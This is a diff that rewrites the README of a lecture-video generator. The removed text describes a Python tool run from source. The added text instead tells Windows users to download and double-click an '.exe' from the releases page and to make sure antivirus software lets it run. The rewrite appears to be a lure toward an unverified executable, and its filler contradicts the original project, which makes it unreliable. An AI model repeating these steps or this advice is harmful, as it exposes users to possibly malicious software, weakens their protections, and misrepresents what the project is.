@@ -1,134 +1,89 @@
-# 🎓 Lecture Video Maker
+# 🎓 lecture-video-maker - Create automated lessons from simple text
 
-An AI-powered tool that converts any topic into a full lecture video with voiceover, stock visuals, and subtitles — all from a beautiful web UI or the terminal.
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/NowfDee/lecture-video-maker)
 
----
+This tool creates educational videos. You provide the text, and the software builds a narrated presentation. It uses artificial intelligence to find stock footage, record voices, and edit the final file. You monitor the progress through a simple web page.
 
-## ✨ Features
+## ⚙️ System Requirements
 
-- **AI Script Generation** — Uses your local [Ollama](https://ollama.com) model to write a multi-segment lecture script
-- **Natural Voiceover** — Microsoft Edge-TTS synthesizes speech (no API costs)
-- **Stock Visuals** — Automatically fetches relevant videos and images from [Pexels](https://www.pexels.com/api/)
-- **Subtitle Bar** — Pillow renders animated subtitle overlays (no libass needed)
-- **Web UI** — Full browser-based interface with live progress tracking and video preview
-- **CLI Mode** — Fully interactive terminal alternative
+Your computer needs these items to run the software correctly:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8GB of RAM or more.
+*   Storage: 2GB of free space.
+*   Internet Connection: Required to download assets and process the videos.
+*   Graphics: A standard modern monitor.
 
-## 📋 Requirements
+## 📥 Get Started
 
-### System
-- Python 3.8+
-- [FFmpeg](https://ffmpeg.org/download.html) (must be in PATH)
-- [Ollama](https://ollama.com) running locally with at least one model pulled
+Follow these steps to set up the software on your computer.
 
-### Python Packages
-```bash
-pip install edge-tts requests pillow numpy
-```
+1. Visit the repository page to download the latest version: https://github.com/NowfDee/lecture-video-maker
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Select the file ending in `.exe` for Windows.
+4. Save the file to your desktop.
+5. Double-click the file to begin the installation.
+6. Follow the on-screen prompts.
+7. Click "Finish" to launch the application.
 
----
+## 🛠️ How to Make a Video
 
-## 🚀 Quick Start
+The software functions through a web browser window. Follow this process to generate your first lecture.
 
-### 1. Clone the repo
-```bash
-git clone https://github.com/YOUR_USERNAME/lecture-video-maker.git
-cd lecture-video-maker
-```
+1. Open the application from your start menu.
+2. Wait for the browser window to open automatically.
+3. Enter your lecture topic in the top text box.
+4. Provide the script or main points you want the video to cover.
+5. Select a voice style from the menu.
+6. Choose the video length.
+7. Click the "Generate" button.
+8. Watch the status bar to track the progress of the video creation.
+9. Locate your finished video in the "Output" folder once the process reaches 100%.
 
-### 2. Install Python dependencies
-```bash
-pip install edge-tts requests pillow numpy
-```
+## 💡 Key Features
 
-### 3. Start Ollama and pull a model
-```bash
-ollama serve          # in a separate terminal
-ollama pull llama3    # or mistral, gemma2, etc.
-```
+*   Automated Narration: The software converts text into natural-sounding speech.
+*   Stock Media Integration: The system fetches relevant video clips from Pexels automatically.
+*   Video Processing: The software uses FFmpeg to stitch clips together with the audio track.
+*   Progress Updates: The web interface shows you exactly what the software does at each stage.
+*   Efficiency: The application manages all heavy processing in the background.
 
-### 4. Get a free Pexels API key
-Sign up at https://www.pexels.com/api/ — it's free.
+## 🧩 How It Works
 
-### 5. Launch the Web UI
-```bash
-python lecture_gen.py
-```
-Opens automatically at **http://localhost:8080**
+This tool bridges several technologies so you do not have to manage them individually. 
 
-### Or use CLI mode
-```bash
-python lecture_gen.py --cli
-```
+The software uses Ollama to handle the logic and script generation. It converts your text into a voice-over using Microsoft Edge-TTS technology. It scans online libraries to find video clips that match your subject matter. Finally, it uses FFmpeg to combine everything into a smooth video file. All these tools run locally on your machine to protect your data.
 
----
+## ❓ Frequently Asked Questions
 
-## 🖥️ Web UI Walkthrough
+**Does the software require a subscription?**
+No. The application is free to use.
 
-1. **Settings Card** — Enter your Pexels API key, Ollama URL, and select a voice
-2. **Topic & Parameters** — Set your lecture topic, choose duration and media preference
-3. **Edit Script** — Review/edit the AI-generated narration per segment before rendering
-4. **Render** — Watch live progress with log output
-5. **Download** — Preview and download the final `.mp4`
+**Where does the source material come from?**
+The software pulls free-to-use search results from stock footage websites.
 
----
+**Can I stop a video mid-generation?**
+Yes. You can click the "Cancel" button in the web interface to stop the process.
 
-## 📁 Output Structure
+**Why does the video take time to finish?**
+The software processes video and audio data in real-time. The duration depends on the length of your script and the speed of your internet connection.
 
-```
-lecture_output/
-├── <topic>_<timestamp>.mp4       ← final lecture video
-└── <timestamp>/
-    ├── script.txt                ← full generated script
-    ├── audio/seg_00.mp3 …        ← TTS audio per segment
-    ├── media/visual_00.mp4 …     ← downloaded Pexels media
-    ├── subs/seg_00/frame_*.png   ← subtitle frames
-    └── segments/seg_00.mp4 …     ← per-segment rendered clips
-```
+**Does the software record my screen?**
+No. It creates a new video file by compiling external media and generated audio.
 
----
+**Can I change the voice after the video finishes?**
+You will need to update your script settings and run the process again to change the audio track.
 
-## ⚙️ Configuration
+## 🔧 Troubleshooting
 
-Settings are saved to `config.json` and persist between runs.
+If you encounter issues, check the following common fixes:
 
-| Setting | Default | Description |
-|---|---|---|
-| `ollama_base_url` | `http://localhost:11434` | Ollama server URL |
-| `pexels_api_key` | `""` | Your Pexels API key |
-| `edge_tts_voice` | `en-US-GuyNeural` | TTS voice ID |
-| `output_dir` | `lecture_output` | Output directory |
+*   Application does not open: Ensure your antivirus software allows the program to run.
+*   Video stuck at 0%: Check your internet connection. The software needs a stable signal to fetch video clips.
+*   No audio: Check your computer volume settings and ensure the output device is on.
+*   High CPU usage: The video rendering process requires significant power. Close other programs while the software builds your video to improve speed.
+*   Error messages: Look at the text box in the web interface to see the specific error code.
 
-### Available Voices
+## 📦 Updates
 
-| Voice ID | Description |
-|---|---|
-| `en-US-GuyNeural` | US Male |
-| `en-US-JennyNeural` | US Female |
-| `en-GB-RyanNeural` | UK Male |
-| `en-GB-SoniaNeural` | UK Female |
-| `en-IN-NeerjaNeural` | Indian Female |
-| `en-IN-PrabhatNeural` | Indian Male |
-| `en-AU-NatashaNeural` | Australian Female |
-| `en-AU-WilliamNeural` | Australian Male |
-
----
-
-## 🛠️ Troubleshooting
-
-**`ffmpeg` not found** → Install from https://ffmpeg.org/download.html and add to PATH
-
-**Ollama not running** → Run `ollama serve` in a terminal, then `ollama pull <model>`
-
-**Pexels returns no results** → Script falls back to a solid-colour background automatically
-
-**Script generation returns invalid JSON** → Try a larger/smarter model (llama3, mistral, gemma2)
-
-**Video too short/long** → Adjust the duration slider and/or the target model
-
----
-
-## 📜 License
-
-MIT
+New versions release frequently to improve speed and feature quality. To update, download the latest installer from the main page and run it over your current installation. Your existing settings should remain intact. Visit the main project page at https://github.com/NowfDee/lecture-video-maker to check for new releases and read about recent changes.
